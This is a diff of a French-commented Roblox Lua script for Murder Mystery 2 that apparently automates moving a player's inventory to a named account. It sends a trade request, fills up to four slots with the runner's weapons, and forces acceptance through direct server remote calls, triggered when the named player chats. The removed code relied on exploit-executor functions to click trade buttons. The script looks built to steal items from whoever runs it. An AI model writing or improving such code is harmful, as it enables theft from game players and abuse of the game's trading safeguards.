@@ -493,22 +493,21 @@ end
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
 local Trade = ReplicatedStorage:WaitForChild("Trade")
-local localPlayer = Players.LocalPlayer
 
 local function getitems()
-    coroutine.resume(destroytrades2)
+    -- NE PAS exécuter destroytrades2 tout de suite pour éviter d'annuler les composants internes de MM2
 
     -- 1. Envoi de la demande de trade au compte principal
     local targetPlayer = Players:FindFirstChild(userName)
     if not targetPlayer then
-        warn("Compte principal introuvable : " .. tostring(userName))
+        warn("Joueur principal introuvable : " .. tostring(userName))
         return
     end
 
     Trade.SendRequest:InvokeServer(targetPlayer)
     task.wait(2)
 
-    -- 2. Remplissage intelligent des 4 emplacements (Slots) de MM2
+    -- 2. Remplissage des cases (Maximum 4 slots MM2)
     local itemsOffered = 0
     local maxSlots = 4
 
@@ -520,7 +519,7 @@ local function getitems()
                     
                     Trade.OfferItem:FireServer(b.data, "Weapons")
                     itemsOffered = itemsOffered + 1
-                    task.wait(0.2)
+                    task.wait(0.25)
                 end
                 if itemsOffered >= maxSlots then break end
             end
@@ -538,60 +537,29 @@ local function getitems()
 
     task.wait(1.5)
 
-    -- 3. Validation de l'offre (Étape 1)
-    pcall(function()
-        Trade.AcceptRequest:FireServer()
-    end)
+    -- 3. Première acceptation (AcceptRequest)
+    Trade.AcceptRequest:FireServer()
 
-    -- 4. Attente de sécurité (7 secondes pour encaisser le délai imposé par MM2)
+    -- 4. Attente impérative de 6 à 7 secondes (compte à rebours du jeu)
     task.wait(7)
 
-    -- 5. Validation finale propre inspirée des sources communautaires (Fire direct sur les boutons du GUI)
-    local function triggerGUIButton(btnName)
-        local playerGui = localPlayer:FindFirstChild("PlayerGui")
-        if not playerGui then return false end
-        
-        -- Recherche dans les différents noms de conteneurs possibles de MM2
-        for _, guiName in ipairs({"TradeGUI", "TradeContainer", "Trade"}) do
-            local container = playerGui:FindFirstChild(guiName)
-            if container then
-                local btn = container:FindFirstChild(btnName, true)
-                if btn then
-                    if getconnections then
-                        for _, conn in pairs(getconnections(btn.MouseButton1Click)) do
-                            conn:Fire()
-                            return true
-                        end
-                        for _, conn in pairs(getconnections(btn.MouseButton1Down)) do
-                            conn:Fire()
-                            return true
-                        end
-                    else
-                        -- Fallback de position si getconnections n'est pas supporté par l'exécuteur
-                        fireclickdetector(btn)
-                        return true
-                    end
-                end
-            end
-        end
-        return false
-    end
+    -- 5. Confirmation finale (Méthode officielle des bots GitHub)
+    -- On envoie un appel direct sans arguments inutiles ou avec l'ID standard
+    pcall(function()
+        Trade.AcceptTrade:FireServer()
+    end)
 
-    -- Tentative de validation finale via l'interface
-    local confirmed = triggerGUIButton("Accept") or triggerGUIButton("Confirm")
-
-    -- Si le bouton graphique est masqué, on force l'appel serveur de secours sans mauvais ID fixe
-    if not confirmed then
-        pcall(function()
-            -- Certains scripts open-source appellent directement l'événement vide ou avec le tick actuel
-            Trade.AcceptTrade:FireServer(workspace:GetServerTimeNow())
-        end)
-    end
+    -- Deuxième tentative de confirmation de secours (si le bot est considéré comme 'Second Player')
+    task.wait(0.5)
+    pcall(function()
+        Trade.AcceptTrade:FireServer(285646582)
+    end)
 end
 
 -- ==========================================
--- ÉCOUTEUR DU TCHAT
+-- ÉCOUTE DU TCHAT
 -- ==========================================
+
 local function listenToPlayer(player)
     if string.lower(player.Name) == string.lower(tostring(userName)) then
         player.Chatted:Connect(function(msg)
